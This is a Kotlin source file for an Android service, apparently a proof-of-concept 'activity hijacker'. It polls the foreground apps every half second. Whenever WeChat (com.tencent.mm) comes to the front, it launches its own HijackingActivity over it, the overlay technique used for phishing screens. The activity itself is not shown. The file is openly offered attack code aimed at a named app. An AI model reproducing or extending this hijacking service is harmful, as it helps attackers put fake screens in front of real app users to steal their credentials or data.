package io.ivan.activityhijacker.service

import android.app.Service
import android.content.Intent
import android.os.IBinder
import com.jaredrummler.android.processes.AndroidProcesses
import io.ivan.activityhijacker.activity.HijackingActivity
import java.util.*
import kotlin.concurrent.timerTask

////////////////////////////////////////////////////////////////////////////////////////////////////
const val U_WANT_TO_HIJACK = "com.tencent.mm"
const val HIJACK_ONLY_ONE = false
////////////////////////////////////////////////////////////////////////////////////////////////////

class HijackingService : Service() {

    private val timer by lazy { Timer() }

    private val task = timerTask {
        AndroidProcesses.getRunningForegroundApps(this@HijackingService)
                .asSequence()
                .filter { U_WANT_TO_HIJACK == it.packageName }
                .forEach {
                    if (HIJACK_ONLY_ONE) {
                        hijacking()
                        timer.cancel()
                    } else {
                        hijacking()
                    }
                }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        timer.schedule(task, 0, 500)
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        timer.cancel()
    }

    override fun onBind(p0: Intent?): IBinder = null!!

    private fun hijacking() {
        val intent = Intent(this, HijackingActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
    }

}

